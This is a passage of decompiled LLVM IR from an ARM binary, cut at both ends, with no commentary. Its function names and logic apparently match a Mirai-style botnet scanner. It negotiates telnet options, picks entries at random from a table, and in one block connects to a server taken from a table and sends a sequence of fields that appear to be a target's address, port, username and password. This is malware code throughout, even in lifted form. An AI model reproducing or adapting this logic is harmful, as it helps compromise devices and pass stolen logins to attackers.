  %v3_10144 = icmp uge i32 %v2_10140, %v1_1013c
  store i1 %v3_10144, i1* %cpsr_c.global-to-local, align 1
  %v9_10144 = icmp eq i32 %v2_10140, %v1_1013c
  store i1 %v9_10144, i1* %cpsr_z.global-to-local, align 1
  %v2_10148 = xor i1 %v3_10144, true
  %v3_10148 = or i1 %v9_10144, %v2_10148
  br i1 %v3_10148, label %dec_label_pc_10108.dec_label_pc_fb28.loopexit_crit_edge, label %dec_label_pc_1014c

dec_label_pc_10108.dec_label_pc_fb28.loopexit_crit_edge: ; preds = %dec_label_pc_10108
  %v0_fb28.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_fb28

dec_label_pc_1014c:                               ; preds = %dec_label_pc_10108
  %v2_1014c = inttoptr i32 %v1_1013c to i8*
  %v3_1014c = load i8, i8* %v2_1014c, align 1
  %v4_1014c = zext i8 %v3_1014c to i32
  store i32 %v4_1014c, i32* %r3.global-to-local, align 4
  %v2_10150 = icmp ugt i8 %v3_1014c, 30
  store i1 %v2_10150, i1* %cpsr_c.global-to-local, align 1
  %v7_10150 = icmp eq i8 %v3_1014c, 31
  store i1 %v7_10150, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10150, label %dec_label_pc_1021c, label %dec_label_pc_10158

dec_label_pc_10158:                               ; preds = %dec_label_pc_1014c
  %v1_10158 = inttoptr i32 %v0_1013c to i8*
  %v2_10158 = load i8, i8* %v1_10158, align 1
  %v3_10158 = zext i8 %v2_10158 to i32
  store i32 %v3_10158, i32* %r3.global-to-local, align 4
  %v2_1015c = icmp ugt i8 %v2_10158, -4
  store i1 %v2_1015c, i1* %cpsr_c.global-to-local, align 1
  %v7_1015c = icmp eq i8 %v2_10158, -3
  store i1 %v7_1015c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1015c, label %.thread145, label %dec_label_pc_1016c

.thread145:                                       ; preds = %dec_label_pc_10158
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_10158, align 1
  %v0_10168.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10168.pr.pr, label %dec_label_pc_fac0, label %.thread145.dec_label_pc_1016cthread-pre-split_crit_edge

.thread145.dec_label_pc_1016cthread-pre-split_crit_edge: ; preds = %.thread145
  %v0_1016c.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1016c

dec_label_pc_1016c:                               ; preds = %dec_label_pc_10158, %.thread145.dec_label_pc_1016cthread-pre-split_crit_edge
  %v0_1016c.pr = phi i32 [ %v0_1016c.pr.pre, %.thread145.dec_label_pc_1016cthread-pre-split_crit_edge ], [ %v3_10158, %dec_label_pc_10158 ]
  %v2_1016c = icmp ugt i32 %v0_1016c.pr, 250
  store i1 %v2_1016c, i1* %cpsr_c.global-to-local, align 1
  %v7_1016c = icmp eq i32 %v0_1016c.pr, 251
  store i1 %v7_1016c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1016c, label %bb459, label %dec_label_pc_fac0

bb459:                                            ; preds = %dec_label_pc_1016c
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_10174 = load i32, i32* @r4, align 4
  %v4_10174 = inttoptr i32 %v3_10174 to i8*
  store i8 -3, i8* %v4_10174, align 1
  br label %dec_label_pc_fac0

dec_label_pc_1017c:                               ; preds = %dec_label_pc_10030, %dec_label_pc_10050, %dec_label_pc_10048, %dec_label_pc_10040, %bb457, %dec_label_pc_1001c, %dec_label_pc_fff8, %dec_label_pc_10014, %dec_label_pc_1000c, %bb456
  %v0_10180 = phi i32 [ %v1_ffec, %dec_label_pc_1001c ], [ %v1_ffec, %dec_label_pc_fff8 ], [ %v1_ffec, %dec_label_pc_10014 ], [ %v1_ffec, %dec_label_pc_1000c ], [ %v1_ffec, %bb456 ], [ %v1_1005c, %bb457 ], [ %v1_1005c, %dec_label_pc_10040 ], [ %v1_1005c, %dec_label_pc_10048 ], [ %v1_1005c, %dec_label_pc_10050 ], [ %v1_1005c, %dec_label_pc_10030 ]
  store i32 31, i32* %r0.global-to-local, align 4
  %v1_10180 = add i32 %v0_10180, 1
  store i32 %v1_10180, i32* @r7, align 4
  %v1_10184 = call i32 @table_lock_val(i32 31)
  store i32 32, i32* %r0.global-to-local, align 4
  %v1_1018c = call i32 @table_lock_val(i32 32)
  store i32 %v1_1018c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10190

dec_label_pc_10190:                               ; preds = %dec_label_pc_100ec, %dec_label_pc_1017c
  %v0_10190 = load i32, i32* @r6, align 4
  %v1_10190 = inttoptr i32 %v0_10190 to i32*
  %v2_10190 = load i32, i32* %v1_10190, align 4
  store i32 %v2_10190, i32* %r3.global-to-local, align 4
  %v1_10194 = add i32 %v0_10190, 4
  %v2_10194 = inttoptr i32 %v1_10194 to i32*
  %v3_10194 = load i32, i32* %v2_10194, align 4
  store i32 %v3_10194, i32* %r0.global-to-local, align 4
  %v1_10198 = add i32 %v2_10190, 12
  %v2_10198 = inttoptr i32 %v1_10198 to i8*
  %v3_10198 = load i8, i8* %v2_10198, align 1
  %v4_10198 = zext i8 %v3_10198 to i32
  store i32 %v4_10198, i32* %r2.global-to-local, align 4
  %v1_1019c = inttoptr i32 %v2_10190 to i32*
  %v2_1019c = load i32, i32* %v1_1019c, align 4
  store i32 %v2_1019c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_101a4 = call i32 @__libc_send(i32 %v3_10194, i32 %v2_1019c, i32 %v4_10198, i32 16384)
  store i32 %v4_101a4, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_101ac = load i32, i32* @r6, align 4
  %v1_101ac = add i32 %v0_101ac, 4
  %v2_101ac = inttoptr i32 %v1_101ac to i32*
  %v3_101ac = load i32, i32* %v2_101ac, align 4
  store i32 %v3_101ac, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19b60.207 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_101b8 = call i32 @__libc_send(i32 %v3_101ac, i32 ptrtoint ([3 x i8]* @global_var_19b60.207 to i32), i32 2, i32 16384)
  store i32 %v4_101b8, i32* %r0.global-to-local, align 4
  store i32 4, i32* @r3, align 4
  %v1_101c0 = load i32, i32* @r6, align 4
  %v2_101c0 = add i32 %v1_101c0, 12
  %v3_101c0 = inttoptr i32 %v2_101c0 to i32*
  store i32 4, i32* %v3_101c0, align 4
  br label %dec_label_pc_f964

dec_label_pc_101c8:                               ; preds = %dec_label_pc_fe68, %dec_label_pc_fe80, %dec_label_pc_fe78, %bb451, %dec_label_pc_fe54, %dec_label_pc_fe38, %dec_label_pc_fe4c, %bb450
  %v0_101cc = phi i32 [ %v1_fe2c, %dec_label_pc_fe54 ], [ %v1_fe2c, %dec_label_pc_fe38 ], [ %v1_fe2c, %dec_label_pc_fe4c ], [ %v1_fe2c, %bb450 ], [ %v1_fe8c, %bb451 ], [ %v1_fe8c, %dec_label_pc_fe78 ], [ %v1_fe8c, %dec_label_pc_fe80 ], [ %v1_fe8c, %dec_label_pc_fe68 ]
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_101cc = add i32 %v0_101cc, 1
  store i32 %v1_101cc, i32* @r7, align 4
  %v1_101d0 = call i32 @table_lock_val(i32 30)
  br label %dec_label_pc_fedc

dec_label_pc_101d8:                               ; preds = %dec_label_pc_f840
  store i32 %v1_f87c, i32* %r0.global-to-local, align 4
  %v0_101e0 = load i32, i32* @r6, align 4
  %v1_101e0 = add i32 %v0_101e0, 4
  %v2_101e0 = inttoptr i32 %v1_101e0 to i32*
  %v3_101e0 = load i32, i32* %v2_101e0, align 4
  store i32 %v3_101e0, i32* %r0.global-to-local, align 4
  %v1_101e4 = call i32 @__GI___libc_close(i32 %v3_101e0)
  store i32 %v1_101e4, i32* %r0.global-to-local, align 4
  %v0_101e8 = load i32, i32* @r6, align 4
  %v1_101e8 = add i32 %v0_101e8, 284
  %v2_101e8 = inttoptr i32 %v1_101e8 to i8*
  %v3_101e8 = load i8, i8* %v2_101e8, align 1
  %v4_101e8 = zext i8 %v3_101e8 to i32
  %v1_101ec = add nuw nsw i32 %v4_101e8, 1
  %v1_101f0 = urem i32 %v1_101ec, 256
  store i32 %v1_101f0, i32* @r3, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_101f8 = icmp ugt i32 %v1_101f0, 9
  store i1 %v2_101f8, i1* %cpsr_c.global-to-local, align 1
  %v7_101f8 = icmp eq i32 %v1_101f0, 10
  store i1 %v7_101f8, i1* %cpsr_z.global-to-local, align 1
  %v2_101fc = add i32 %v0_101e8, 4
  %v3_101fc = inttoptr i32 %v2_101fc to i32*
  store i32 -1, i32* %v3_101fc, align 4
  %v0_10200 = load i32, i32* @r3, align 4
  %v1_10200 = trunc i32 %v0_10200 to i8
  %v2_10200 = load i32, i32* @r6, align 4
  %v3_10200 = add i32 %v2_10200, 284
  %v4_10200 = inttoptr i32 %v3_10200 to i8*
  store i8 %v1_10200, i8* %v4_10200, align 1
  %v0_10204 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10204, label %dec_label_pc_10208, label %dec_label_pc_10264

dec_label_pc_10208:                               ; preds = %dec_label_pc_101d8
  store i32 0, i32* @r3, align 4
  store i32 -1, i32* @r7, align 4
  %v1_10210 = load i32, i32* @r6, align 4
  %v2_10210 = add i32 %v1_10210, 12
  %v3_10210 = inttoptr i32 %v2_10210 to i32*
  store i32 0, i32* %v3_10210, align 4
  %v0_10214 = load i32, i32* @r3, align 4
  %v1_10214 = trunc i32 %v0_10214 to i8
  %v2_10214 = load i32, i32* @r6, align 4
  %v3_10214 = add i32 %v2_10214, 284
  %v4_10214 = inttoptr i32 %v3_10214 to i8*
  store i8 %v1_10214, i8* %v4_10214, align 1
  br label %dec_label_pc_f96c

dec_label_pc_1021c:                               ; preds = %dec_label_pc_1014c
  store i32 %v2_1010c, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v1_10228 = add i32 %v0_10138, 4
  %v2_10228 = inttoptr i32 %v1_10228 to i32*
  %v3_10228 = load i32, i32* %v2_10228, align 4
  store i32 %v3_10228, i32* %r0.global-to-local, align 4
  %v4_1022c = call i32 @__libc_send(i32 %v3_10228, i32 %v2_1010c, i32 3, i32 16384)
  store i32 %v4_1022c, i32* %r0.global-to-local, align 4
  %v0_10230 = load i32, i32* @r6, align 4
  %v1_10230 = add i32 %v0_10230, 4
  %v2_10230 = inttoptr i32 %v1_10230 to i32*
  %v3_10230 = load i32, i32* %v2_10230, align 4
  store i32 %v3_10230, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fb0c

dec_label_pc_10240:                               ; preds = %dec_label_pc_f724
  store i32 %.pre, i32* @r0, align 4
  %v1_10248 = add i32 %v0_10240, 92
  store i32 %v1_10248, i32* @r1, align 4
  store i32 192, i32* @r2, align 4
  %v3_10250 = call i32 @memmove(i32 %.pre, i32 %v1_10248, i32 192)
  store i32 %v3_10250, i32* %r0.global-to-local, align 4
  %v0_10254 = load i32, i32* @r6, align 4
  %v1_10254 = add i32 %v0_10254, 24
  %v2_10254 = inttoptr i32 %v1_10254 to i32*
  %v3_10254 = load i32, i32* %v2_10254, align 4
  %v1_10258 = add i32 %v3_10254, -64
  store i32 %v1_10258, i32* %r3.global-to-local, align 4
  store i32 %v1_10258, i32* %v2_10254, align 4
  br label %dec_label_pc_f734

dec_label_pc_10264:                               ; preds = %dec_label_pc_101d8
  %v0_10264 = load i32, i32* @r6, align 4
  store i32 %v0_10264, i32* @r0, align 4
  %v0_10268 = call i32 @setup_connection()
  store i32 %v0_10268, i32* %r0.global-to-local, align 4
  store i32 -1, i32* @r7, align 4
  br label %dec_label_pc_f96c

dec_label_pc_10274:                               ; preds = %dec_label_pc_f6dc
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-60, align 4
  store i32 %v2_ee58, i32* %r3.global-to-local, align 4
  store i32 %v2_10078, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 1, i32* @r1, align 4
  store i32 0, i32* %stack_var_-56, align 4
  %v5_1029c = call i32 @getsockopt(i32 %v3_f6d0, i32 1, i32 4, i32 %v2_ee58, i32 %v2_10078)
  %v3_102a0 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_102a0, i32* %r3.global-to-local, align 4
  %v2_102a4 = or i32 %v3_102a0, %v5_1029c
  store i32 %v2_102a4, i32* %r0.global-to-local, align 4
  %v4_102a4 = icmp eq i32 %v2_102a4, 0
  store i1 %v4_102a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_102a4, label %dec_label_pc_102ac, label %dec_label_pc_10338

dec_label_pc_102ac:                               ; preds = %dec_label_pc_10274
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_102b0 = load i32, i32* @r6, align 4
  %v2_102b0 = add i32 %v1_102b0, 12
  %v3_102b0 = inttoptr i32 %v2_102b0 to i32*
  store i32 2, i32* %v3_102b0, align 4
  %v0_102b4 = call i32 @rand_next()
  %v2_102bc = load i16, i16* bitcast (i16** @global_var_224ac.148 to i16*), align 4
  %v3_102bc = zext i16 %v2_102bc to i32
  %v2_102c0 = udiv i32 %v0_102b4, %v3_102bc
  %v3_102c0 = urem i32 %v0_102b4, %v3_102bc
  store i32 %v2_102c0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2247c.144 to i32), i32* %r3.global-to-local, align 4
  %v2_102c8 = load i32, i32* @global_var_2247c.144, align 4
  store i32 %v2_102c8, i32* %ip.global-to-local, align 4
  %v1_102d0 = load i32, i32* @r4, align 4
  %v9_102d0 = icmp eq i32 %v2_102c8, %v1_102d0
  store i1 %v9_102d0, i1* %cpsr_z.global-to-local, align 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v3_102c0, i32* %r1.global-to-local, align 4
  %v7_102d8 = icmp sgt i32 %v2_102c8, %v1_102d0
  br i1 %v7_102d8, label %dec_label_pc_102dc, label %dec_label_pc_10314

dec_label_pc_102dc:                               ; preds = %dec_label_pc_102ac
  %v2_102e0 = load i32, i32* @global_var_224a8.146, align 4
  store i32 %v2_102e0, i32* %r3.global-to-local, align 4
  store i32 %v1_102d0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_102e8

dec_label_pc_102e8:                               ; preds = %dec_label_pc_10304, %dec_label_pc_102dc
  %v0_10304 = phi i32 [ %v1_10304, %dec_label_pc_10304 ], [ %v1_102d0, %dec_label_pc_102dc ]
  %v0_1030c = phi i32 [ %v1_1030c, %dec_label_pc_10304 ], [ %v2_102e0, %dec_label_pc_102dc ]
  store i32 %v0_1030c, i32* %r0.global-to-local, align 4
  %v1_102ec = add i32 %v0_1030c, 8
  %v2_102ec = inttoptr i32 %v1_102ec to i16*
  %v3_102ec = load i16, i16* %v2_102ec, align 2
  %v4_102ec = zext i16 %v3_102ec to i32
  store i32 %v4_102ec, i32* %r3.global-to-local, align 4
  %tmp460 = icmp ugt i32 %v4_102ec, %v3_102c0
  br i1 %tmp460, label %dec_label_pc_10304, label %dec_label_pc_102f8

dec_label_pc_102f8:                               ; preds = %dec_label_pc_102e8
  %v1_102f8 = add i32 %v0_1030c, 10
  %v2_102f8 = inttoptr i32 %v1_102f8 to i16*
  %v3_102f8 = load i16, i16* %v2_102f8, align 2
  %v4_102f8 = zext i16 %v3_102f8 to i32
  store i32 %v4_102f8, i32* %r3.global-to-local, align 4
  %v3_102fc = icmp uge i32 %v4_102f8, %v3_102c0
  %v9_102fc = icmp eq i32 %v4_102f8, %v3_102c0
  %v2_10300 = xor i1 %v9_102fc, true
  %v3_10300 = and i1 %v3_102fc, %v2_10300
  br i1 %v3_10300, label %dec_label_pc_10318.loopexit, label %dec_label_pc_10304

dec_label_pc_10304:                               ; preds = %dec_label_pc_102f8, %dec_label_pc_102e8
  %v1_10304 = add i32 %v0_10304, 1
  store i32 %v1_10304, i32* %r2.global-to-local, align 4
  %v9_10308 = icmp eq i32 %v1_10304, %v2_102c8
  %v1_1030c = add i32 %v0_1030c, 16
  store i32 %v1_1030c, i32* %r3.global-to-local, align 4
  br i1 %v9_10308, label %dec_label_pc_10314.loopexit, label %dec_label_pc_102e8

dec_label_pc_10314.loopexit:                      ; preds = %dec_label_pc_10304
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10314

dec_label_pc_10314:                               ; preds = %dec_label_pc_10314.loopexit, %dec_label_pc_102ac
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10318

dec_label_pc_10318.loopexit:                      ; preds = %dec_label_pc_102f8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v9_102fc, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10318

dec_label_pc_10318:                               ; preds = %dec_label_pc_10318.loopexit, %dec_label_pc_10314
  %v0_1032c = phi i32 [ %v0_1030c, %dec_label_pc_10318.loopexit ], [ 0, %dec_label_pc_10314 ]
  %v0_10318 = load i32, i32* @r6, align 4
  %v1_10318 = add i32 %v0_10318, 4
  %v2_10318 = inttoptr i32 %v1_10318 to i32*
  %v3_10318 = load i32, i32* %v2_10318, align 4
  %v3_1031c = udiv i32 %v3_10318, 32
  store i32 %v3_1031c, i32* %r2.global-to-local, align 4
  %v1_10320 = urem i32 %v3_10318, 32
  store i32 %v1_10320, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_10324 = mul nuw nsw i32 %v3_1031c, 4
  store i32 %v3_10324, i32* @ip, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_1032c = inttoptr i32 %v0_10318 to i32*
  store i32 %v0_1032c, i32* %v2_1032c, align 4
  %v0_10330 = load i32, i32* %r3.global-to-local, align 4
  %v1_10330 = load i32, i32* @r6, align 4
  %v2_10330 = add i32 %v1_10330, 24
  %v3_10330 = inttoptr i32 %v2_10330 to i32*
  store i32 %v0_10330, i32* %v3_10330, align 4
  %v0_f704.pre = load i32, i32* @ip, align 4
  %v1_f70c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_f700

dec_label_pc_10338:                               ; preds = %dec_label_pc_10274
  %v0_10338 = load i32, i32* @r6, align 4
  %v1_10338 = add i32 %v0_10338, 4
  %v2_10338 = inttoptr i32 %v1_10338 to i32*
  %v3_10338 = load i32, i32* %v2_10338, align 4
  store i32 %v3_10338, i32* %r0.global-to-local, align 4
  %v1_1033c = call i32 @__GI___libc_close(i32 %v3_10338)
  store i32 %v1_1033c, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_10344 = load i32, i32* @r4, align 4
  %v1_10344 = load i32, i32* @r6, align 4
  %v2_10344 = add i32 %v1_10344, 12
  %v3_10344 = inttoptr i32 %v2_10344 to i32*
  store i32 %v0_10344, i32* %v3_10344, align 4
  %v0_10348 = load i32, i32* %r3.global-to-local, align 4
  %v1_10348 = load i32, i32* @r6, align 4
  %v2_10348 = add i32 %v1_10348, 4
  %v3_10348 = inttoptr i32 %v2_10348 to i32*
  store i32 %v0_10348, i32* %v3_10348, align 4
  %v0_1034c = load i32, i32* @r4, align 4
  %v1_1034c = trunc i32 %v0_1034c to i8
  %v2_1034c = load i32, i32* @r6, align 4
  %v3_1034c = add i32 %v2_1034c, 284
  %v4_1034c = inttoptr i32 %v3_1034c to i8*
  store i8 %v1_1034c, i8* %v4_1034c, align 1
  br label %dec_label_pc_f828

dec_label_pc_10354:                               ; preds = %dec_label_pc_f924
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v2_f8d4, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-96, align 4
  %v1_10360 = add i32 %v1_f940, 4
  %v2_10360 = inttoptr i32 %v1_10360 to i32*
  %v3_10360 = load i32, i32* %v2_10360, align 4
  store i32 %v3_10360, i32* @r4, align 4
  %v0_10364 = call i32 @rand_next()
  store i32 %v0_10364, i32* %r0.global-to-local, align 4
  %v0_10368 = load i32, i32* @r5, align 4
  %v1_10368 = inttoptr i32 %v0_10368 to i8*
  %v2_10368 = load i8, i8* %v1_10368, align 1
  %v3_10368 = zext i8 %v2_10368 to i32
  %v2_1036c = udiv i32 %v0_10364, %v3_10368
  %v3_1036c = urem i32 %v0_10364, %v3_10368
  store i32 %v2_1036c, i32* %r0.global-to-local, align 4
  store i32 %v3_1036c, i32* %r1.global-to-local, align 4
  %v0_10370 = load i32, i32* @r4, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v4_10370 = mul nuw nsw i32 %v3_1036c, 4
  %v5_10370 = add i32 %v0_10370, %v4_10370
  %v6_10370 = inttoptr i32 %v5_10370 to i32*
  %v7_10370 = load i32, i32* %v6_10370, align 4
  store i32 %v7_10370, i32* %r3.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v0_10378 = load i32, i32* @sl, align 4
  store i32 %v0_10378, i32* %r1.global-to-local, align 4
  %v2_10380 = inttoptr i32 %v0_10378 to i32*
  %v3_10380 = call i32 @table_retrieve_val(i32 4, i32* %v2_10380)
  store i32 %v2_f8d4, i32* %r2.global-to-local, align 4
  %v0_10390 = load i32, i32* @r5, align 4
  store i32 %v0_10390, i32* %r0.global-to-local, align 4
  %v1_10394 = call i32 @resolv_entries_free(i32 %v0_10390)
  store i32 3, i32* %r0.global-to-local, align 4
  %v1_1039c = call i32 @table_lock_val(i32 3)
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_103a4 = call i32 @table_lock_val(i32 4)
  %v0_103ac = load i32, i32* @r8, align 4
  store i32 %v0_103ac, i32* %r0.global-to-local, align 4
  store i32 %v2_103b0, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_103b8 = call i32 @__libc_connect(i32 %v0_103ac, i32 %v2_103b0, i32 16)
  store i32 %v3_103b8, i32* %r0.global-to-local, align 4
  %v3_103bc = icmp eq i32 %v3_103b8, -1
  store i1 %v3_103bc, i1* %cpsr_c.global-to-local, align 1
  %v8_103bc = icmp eq i32 %v3_103b8, -1
  store i1 %v8_103bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_103bc, label %dec_label_pc_103c4, label %dec_label_pc_103d4

dec_label_pc_103c4:                               ; preds = %dec_label_pc_10354
  %v0_103c4 = load i32, i32* @r8, align 4
  store i32 %v0_103c4, i32* %r0.global-to-local, align 4
  %v1_103c8 = call i32 @__GI___libc_close(i32 %v0_103c4)
  %v0_103cc = load i32, i32* @sl, align 4
  store i32 %v0_103cc, i32* %r0.global-to-local, align 4
  %v1_103d0 = call i32 @__GI_exit(i32 %v0_103cc)
  store i32 %v1_103d0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_103d4

dec_label_pc_103d4:                               ; preds = %dec_label_pc_10354, %dec_label_pc_103c4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v2_ee58, i32* %r1.global-to-local, align 4
  %v0_103e0 = load i32, i32* @r8, align 4
  store i32 %v0_103e0, i32* %r0.global-to-local, align 4
  %v0_103e4 = load i32, i32* @sl, align 4
  store i32 %v0_103e4, i32* %stack_var_-56, align 4
  %v5_103e8 = call i32 @__libc_send(i32 %v0_103e0, i32 %v2_ee58, i32 1, i32 16384)
  store i32 %v2_10078, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_103fc = load i32, i32* @r8, align 4
  store i32 %v0_103fc, i32* %r0.global-to-local, align 4
  %v4_10400 = call i32 @__libc_send(i32 %v0_103fc, i32 %v2_10078, i32 4, i32 16384)
  store i32 %v2_10408, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10414 = load i32, i32* @r8, align 4
  store i32 %v0_10414, i32* %r0.global-to-local, align 4
  %v4_10418 = call i32 @__libc_send(i32 %v0_10414, i32 %v2_10408, i32 2, i32 16384)
  %v0_1041c = load i32, i32* @sb, align 4
  %v1_1041c = add i32 %v0_1041c, 12
  store i32 %v1_1041c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10428 = load i32, i32* @r8, align 4
  store i32 %v0_10428, i32* %r0.global-to-local, align 4
  %v4_1042c = call i32 @__libc_send(i32 %v0_10428, i32 %v1_1041c, i32 1, i32 16384)
  store i32 %v4_1042c, i32* %r0.global-to-local, align 4
  %v0_10430 = load i32, i32* @sb, align 4
  %v1_10430 = inttoptr i32 %v0_10430 to i32*
  %v2_10430 = load i32, i32* %v1_10430, align 4
  store i32 %v2_10430, i32* %r1.global-to-local, align 4
  %v1_10434 = add i32 %v0_10430, 12
  %v2_10434 = inttoptr i32 %v1_10434 to i8*
  %v3_10434 = load i8, i8* %v2_10434, align 1
  %v4_10434 = zext i8 %v3_10434 to i32
  store i32 %v4_10434, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_1043c = load i32, i32* @r8, align 4
  store i32 %v0_1043c, i32* %r0.global-to-local, align 4
  %v4_10440 = call i32 @__libc_send(i32 %v0_1043c, i32 %v2_10430, i32 %v4_10434, i32 16384)
  %v0_10444 = load i32, i32* @sb, align 4
  %v1_10444 = add i32 %v0_10444, 13
  store i32 %v1_10444, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10450 = load i32, i32* @r8, align 4
  store i32 %v0_10450, i32* %r0.global-to-local, align 4
  %v4_10454 = call i32 @__libc_send(i32 %v0_10450, i32 %v1_10444, i32 1, i32 16384)
  %v0_10458 = load i32, i32* @r8, align 4
  store i32 %v0_10458, i32* %r0.global-to-local, align 4
  %v0_1045c = load i32, i32* @sb, align 4
  %v1_1045c = add i32 %v0_1045c, 13
  %v2_1045c = inttoptr i32 %v1_1045c to i8*
  %v3_1045c = load i8, i8* %v2_1045c, align 1
  %v4_1045c = zext i8 %v3_1045c to i32
  store i32 %v4_1045c, i32* %r2.global-to-local, align 4
  %v1_10460 = add i32 %v0_1045c, 4
  %v2_10460 = inttoptr i32 %v1_10460 to i32*
  %v3_10460 = load i32, i32* %v2_10460, align 4
  store i32 %v3_10460, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_10468 = call i32 @__libc_send(i32 %v0_10458, i32 %v3_10460, i32 %v4_1045c, i32 16384)
  %v0_1046c = load i32, i32* @r8, align 4
  store i32 %v0_1046c, i32* %r0.global-to-local, align 4
  %v1_10470 = call i32 @__GI___libc_close(i32 %v0_1046c)
  store i32 %v1_10470, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10474

dec_label_pc_10474:                               ; preds = %dec_label_pc_f908, %dec_label_pc_103d4
  %v0_10474 = load i32, i32* @sl, align 4
  store i32 %v0_10474, i32* %r0.global-to-local, align 4
  %v1_10478 = call i32 @__GI_exit(i32 %v0_10474)
  store i32 %v1_10478, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1047c

dec_label_pc_1047c.loopexit:                      ; preds = %dec_label_pc_fe94
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1047c

dec_label_pc_1047c:                               ; preds = %dec_label_pc_1047c.loopexit, %dec_label_pc_10474
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_10480 = call i32 @table_lock_val(i32 30)
  store i32 %v1_10480, i32* %r0.global-to-local, align 4
  %v0_10484 = load i32, i32* @r6, align 4
  %v1_10484 = add i32 %v0_10484, 12
  %v2_10484 = inttoptr i32 %v1_10484 to i32*
  %v3_10484 = load i32, i32* %v2_10484, align 4
  store i32 %v3_10484, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f71c.backedge

dec_label_pc_f71c.backedge.thread:                ; preds = %dec_label_pc_f994, %dec_label_pc_fb38, %dec_label_pc_fc0c, %dec_label_pc_fce0, %dec_label_pc_ff14
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f724

dec_label_pc_f71c.backedge.thread565:             ; preds = %dec_label_pc_fc70, %dec_label_pc_fb9c, %dec_label_pc_ff78, %dec_label_pc_fdb8, %dec_label_pc_f9f8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f724

dec_label_pc_f71c.backedge:                       ; preds = %dec_label_pc_f79c, %dec_label_pc_1047c, %dec_label_pc_1048c
  %v0_f724232 = phi i32 [ %v0_1049c, %dec_label_pc_1048c ], [ %v0_10484, %dec_label_pc_1047c ], [ %v0_f79c, %dec_label_pc_f79c ]
  %v0_f71c.be = phi i32 [ %v3_1049c, %dec_label_pc_1048c ], [ %v3_10484, %dec_label_pc_1047c ], [ %v3_f79c, %dec_label_pc_f79c ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f71c = icmp eq i32 %v0_f71c.be, 0
  store i1 %v2_f71c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f71c, label %dec_label_pc_f828, label %dec_label_pc_f724

dec_label_pc_1048c:                               ; preds = %dec_label_pc_100c4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
